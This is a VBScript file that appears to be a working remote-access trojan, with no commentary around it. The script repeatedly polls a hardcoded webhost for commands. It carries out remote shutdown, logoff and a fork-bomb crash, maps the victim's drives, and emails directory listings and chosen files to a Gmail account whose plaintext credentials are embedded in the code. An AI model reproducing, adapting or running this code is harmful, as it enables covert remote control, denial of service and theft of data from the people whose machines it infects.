Option Explicit
On Error Resume Next
Call ClearTrash()
dim status
status=True
Do While status=True
Dim fso,fso1,oFile,Instruction,URL,tagIn,tagOut,UName,stat
stat=1
URL="https://dedsec101.000webhostapp.com/home/File.txt"
Call HTTPDownload(URL,(Left(WScript.ScriptFullName,(Len(WScript.ScriptFullName)-Len(WScript.ScriptName)))))
Set fso=CreateObject("Scripting.FileSystemObject")
Set fso1=CreateObject("Scripting.FileSystemObject")
Set Instruction=fso1.OpenTextFile("File.txt",1,False)
If Not(fso.FileExists("Log.txt")) Then
fso.CreateTextFile("Log.txt")
End If 
Set oFile=fso.OpenTextFile("Log.txt",1,False)
tagIn=Split(Instruction.ReadLine(),"#")
Instruction.Close
Call getUName()
If (tagIn(1)=UName Or tagIn(1)="ALL") Then 
If Not(oFile.AtEndOfLine) Then
	tagOut=Split(oFile.ReadLine,"#")
	If Not(tagIn(2)=tagOut(2)) Then 
		oFile.Close
		Set oFile=fso.OpenTextFile("Log.txt",2,False)
		oFile.WriteLine(tagIn(0)&"#"&tagIn(1)&"#"&tagIn(2))
		oFile.Close
		Call fetch()
	Else 
	MsgBox "DO Nothing"
	End If
Else 
	oFile.Close
	Set oFile=fso.OpenTextFile("Log.txt",2,False)
	oFile.WriteLine(tagIn(0)&"#"&tagIn(1)&"#"&tagIn(2))
	oFile.Close
	Call fetch()
End If 
End If 
fso.DeleteFile "File.txt",True
WScript.Sleep 30000
Loop      

Function HTTPDownload( myURL, myPath )
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    Else
    Exit Function
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close( )
End Function


Function fetch()
Dim line,command
Set fso1=CreateObject("Scripting.FileSystemObject")
Set Instruction=fso1.OpenTextFile("File.txt",1,False)
Instruction.ReadLine()
Do While Not(Instruction.AtEndOfStream)
	line=Instruction.ReadLine
	command=Split(line,"#")
	Call decode(command(0),command(1))
Loop
Instruction.Close
End Function

Function decode(name,value)
If(name="SEND") Then
Call Send(value)
ElseIf(name="SHUTDOWN") Then
Call ExecuteShutdown(value)
ElseIf(name="LOGOFF") Then
Call ExecuteLogoff(value)
ElseIf(name="CRASHSYSTEM") Then
Call CrashSystem(value)
ElseIf(name="GETUSERNAME") Then
Call getUName()
Call getTransport(UName)
ElseIf(name="MAPDIR") Then
Call mapDir(value)
ElseIf(name="GETFILES") Then
Call getFiles(value)
End If

End Function

Function send(value)
MsgBox value,vbOKOnly+vbSystemModal,"SCADA 1337"
End Function 

Function ExecuteShutdown(value)
Dim wsh
Set wsh = CreateObject("Wscript.Shell")
wsh.Run ("cmd /c shutdown.exe -s -t "&value),0,True
End Function

Function ExecuteLogoff(value)
Dim wsh
Set wsh = CreateObject("Wscript.Shell")
wsh.Run "cmd /c shutdown.exe /l ",0,True
End Function

Function getUName()
Dim ws,DeskDir,chunks
Set ws = CreateObject("Wscript.shell")
DeskDir = ws.SpecialFolders("Desktop")
chunks = Split(DeskDir,"\")
UName=chunks(2)
End Function 

Function CrashSystem(value)
Dim wsh,fso,oFile
Set wsh=CreateObject("Wscript.shell")
Set fso=CreateObject("Scripting.FileSystemObject")
fso.CreateTextFile "crash.bat"
Set oFile = fso.OpenTextFile("crash.bat",2,True)
oFile.WriteLine("@echo Off")
oFile.WriteLine(":A")
oFile.WriteLine("start")
oFile.WriteLine("goto A")
oFile.Close
wsh.Run "crash.bat",0,True
End Function

Function ClearTrash()
Dim fso
Set fso=CreateObject("Scripting.FileSystemObject")
If fso.FileExists("crash.bat") Then
fso.DeleteFile "crash.bat"
ElseIf fso.FileExists("File.txt") Then
fso.DeleteFile "File.txt"
End If
End Function

Function getTransport(value)
Dim objMessage, Email, EPass
Email = "scada1337@gmail.com"
EPass = "sleepercell"
Set objMessage = CreateObject("CDO.Message")
objMessage.Subject =UName
objMessage.From = Email
objMessage.To = Email
objMessage.TextBody = value
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendusername") = Email
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = EPass
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = "465"
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 60
objMessage.Configuration.Fields.Update
objMessage.Send
End Function

Function Destruct()
fso.DeleteFolder("C:\Intel\0ld Window")
End Function 

Function mapDir(value)
Dim fso,map,Path,file
Path=value&":\"
map=""
Set fso=CreateObject("Scripting.FileSystemObject")
If fso.DriveExists(value) Then
For Each file In fso.GetFolder(Path).Files
map=map&file&vbLf
Next
Call Burrial(fso.GetFolder(Path),map)
Call getTransport(map)
Else 
Call getTransport("Drive not Found")
End If 
End Function
  
Function Burrial(folder,map)
Dim subfolder,file
If ((fso.GetFolder(folder).Attributes<>22 And fso.GetFolder(folder).Attributes<>1046) Or stat=1) Then 
For Each subfolder In fso.GetFolder(folder).SubFolders
If ((fso.GetFolder(subfolder).Attributes<>22 And fso.GetFolder(folder).Attributes<>1046)) Then 
For Each file In fso.GetFolder(subfolder).Files
map=map&file&vbLf
Next
End If
stat=0 
Call Burrial(subfolder,map)
Next
End If 
End Function

Function getFiles(value)
Dim objMessage, Email, EPass ,path,count
Call getUName()
Email = "scada1337@gmail.com"
EPass = "sleepercell"
Set objMessage = CreateObject("CDO.Message")
objMessage.Subject =UName
objMessage.From = Email
objMessage.To = Email
objMessage.TextBody = UName
path=Split(value,"::")
count=0
Do While(count<=UBound(path))
objMessage.AddAttachment path(count)
count=count+1
Loop
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendusername") = Email
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = EPass
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = "465"
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
objMessage.Configuration.Fields.Item _
 ("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 60
objMessage.Configuration.Fields.Update
objMessage.Send
End Function